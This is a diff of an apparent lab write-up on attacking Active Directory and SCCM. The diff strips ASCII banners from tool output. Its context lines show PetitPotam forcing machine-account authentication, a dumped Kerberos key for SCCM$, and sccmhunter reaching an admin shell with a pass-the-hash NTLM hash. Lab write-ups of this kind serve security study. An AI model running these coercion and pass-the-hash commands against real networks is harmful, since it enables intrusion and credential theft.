@@ -59,21 +59,6 @@ The results of the `find` module indicate:
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
 └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 passive.internal.lab
 
-                                                                                               
-              ___            _        _      _        ___            _                     
-             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
-             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
-            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
-          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
-          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
-              PoC to elicit machine account authentication via some MS-EFSRPC functions
-                                      by topotam (@topotam77)
-      
-                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
-
-
-
 Trying pipe lsarpc
 [-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
 [+] Connected!
@@ -169,18 +154,6 @@ lab\SCCM$:des-cbc-md5:5de98a07aefb983e
 ```
  ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
 └─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e -ip 10.10.100.121
-
-                                                                                          (
-                                    888                         d8                         \
- dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
-C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
- Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
-d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
-                                                                                         (
-                                                                 v0.0.2                   
-                                                                 @garrfoster                    
-    
-    
     
 [06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
 () C:\ >> show_admins 
